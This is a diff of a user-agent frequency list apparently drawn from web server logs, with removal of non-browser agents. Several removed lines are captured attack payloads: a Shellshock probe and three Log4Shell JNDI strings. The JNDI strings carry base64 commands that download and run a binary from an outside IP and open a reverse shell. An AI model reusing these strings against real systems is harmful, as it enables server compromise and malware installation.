@@ -1,7 +1,6 @@
 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",834
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",400
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",330
-"Go-http-client/1.1",247
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",217
 "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)",190
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",143
@@ -12,7 +11,6 @@
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",57
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0",54
 "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)",50
-"Mozilla/5.0 zgrab/0.x",49
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",47
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",46
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36",41
@@ -32,9 +30,7 @@
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",14
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",14
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",14
-"Linux Gnu (cow)",13
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",13
-"Mozilla/5.0",12
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",11
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",11
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36",10
@@ -518,7 +514,6 @@
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.8.24",3
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",3
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",3
-"Nacos-Server",3
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",3
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",3
 "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",3
@@ -613,7 +608,6 @@
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",2
 "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",2
 "Mozilla/5.0 (Knoppix; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",2
-"WebCopier v4.6",2
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",2
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",2
 "Mozilla/5.0 (Kubuntu; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0",2
@@ -628,7 +622,6 @@
 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",2
 "Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",2
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",2
-"like Gecko) Chrome/17.0.963.56 Safari/535.11\x22",2
 "Mozilla/5.0 (CentOS; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",2
 "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",2
 "\x22Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML",2
@@ -803,7 +796,6 @@
 "Mozilla/5.0 (Windows NT 9_0; Win64; x64) AppleWebKit/543.52 (KHTML, like Gecko) Chrome/103.0.888 Safari/537.36",1
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/591.49 (KHTML, like Gecko) Chrome/74.0.1419 Safari/537.36",1
 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",1
-"Python-urllib/3.8",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.7.24",1
 "Mozilla/5.0 (Knoppix; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",1
@@ -826,7 +818,6 @@
 "Mozilla/5.0 (Windows NT 9_0_1; Win64; x64) AppleWebKit/584.44 (KHTML, like Gecko) Chrome/86.0.596 Safari/537.36",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0",1
-"() { :; }; echo; echo; /bin/bash -c 'expr 901666191 + 976775538'",1
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/589.40 (KHTML, like Gecko) Chrome/69.0.2913 Safari/537.36",1
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",1
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/569.40 (KHTML, like Gecko) Chrome/61.0.1455 Safari/537.36",1
@@ -874,7 +865,6 @@
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.7.21",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/120.0.0.0 Safari/537.36",1
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6",1
-"like Gecko) Version/5.1 Safari/534.50\x22",1
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/572.43 (KHTML, like Gecko) Chrome/81.0.175 Safari/537.36",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",1
@@ -885,25 +875,16 @@
 "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_7_3; es) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.7 Safari/605.1.15",1
 "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",1
-"7h3h4ckv157",1
-"Report Runner",1
-"Node.js",1
 "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0",1
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/548.48 (KHTML, like Gecko) Chrome/105.0.1155 Safari/537.36",1
 "Mozilla/5.0 (Windows NT 8_1_1; Win64; x64) AppleWebKit/555.37 (KHTML, like Gecko) Chrome/72.0.1624 Safari/537.36",1
 "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1
 "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",1
-"t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//95.214.27.7:5763/TomcatBypass/Command/Base64/cm0gLXJmIC90bXAvYXBhY2hlMiA7IHdnZXQgLU8gL3RtcC9hcGFjaGUyIGh0dHA6Ly85NS4yMTQuMjcuNy9iYXNlL3N5c3RlbS54ODYgOyBjdXJsIC1vIC90bXAvYXBhY2hlMiBodHRwOi8vOTUuMjE0LjI3LjcvYmFzZS9zeXN0ZW0ueDg2IDsgY2htb2QgK3ggL3RtcC9hcGFjaGUyOyBjaG1vZCA3NzcgL3RtcC9hcGFjaGUyIDsgL3RtcC9hcGFjaGUyIFN5c3RlbXg4NiA7IHNoIC1pID4mIC9kZXYvdGNwLzk1LjIxNC4yNy44LzM3NjQgMD4mMQ==}')",1
-"t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//95.214.27.7:5763/TomcatBypass/Command/Base64/d2dldCAtTyAvdG1wL2N1c3RvbXg4NiBodHRwOi8vOTUuMjE0LjI3LjcvYmFzZS9jdXN0b214ODYgOyBjdXJsIC1vIC90bXAvY3VzdG9teDg2IGh0dHA6Ly85NS4yMTQuMjcuNy9iYXNlL2N1c3RvbXg4NiA7IGNobW9kIDc3MCAvdG1wL2N1c3RvbXg4NiA7IGNobW9kIDc3NyAvdG1wL2N1c3RvbXg4NiA7IC90bXAvY3VzdG9teDg2IHg4NiA7IHJtIC1yZiAvdG1wL2N1c3RvbXg4Ng==}')",1
-"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_2_1) AppleWebKit/574.49 (KHTML, like Gecko) Chrome/104.0.2716 Safari/537.36",1
 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",1
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",1
-"t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//95.214.27.7:3472/TomcatBypass/Command/Base64/d2dldCAtTyAvdG1wL2N1c3RvbXg4NiBodHRwOi8vOTUuMjE0LjI3LjcvYmFzZS9jdXN0b214ODYgOyBjdXJsIC1vIC90bXAvY3VzdG9teDg2IGh0dHA6Ly85NS4yMTQuMjcuNy9iYXNlL2N1c3RvbXg4NiA7IGNobW9kIDc3MCAvdG1wL2N1c3RvbXg4NiA7IGNobW9kIDc3NyAvdG1wL2N1c3RvbXg4NiA7IC90bXAvY3VzdG9teDg2IG5ldyA=}')",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_1) AppleWebKit/546.35 (KHTML, like Gecko) Chrome/78.0.2628 Safari/537.36",1
 "Mozilla/5.0 (Windows NT 9_1_1; Win64; x64) AppleWebKit/534.37 (KHTML, like Gecko) Chrome/102.0.1742 Safari/537.36",1
-"MSIE",1
-"asusrouter--",1
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",1
 "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",1
 "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",1
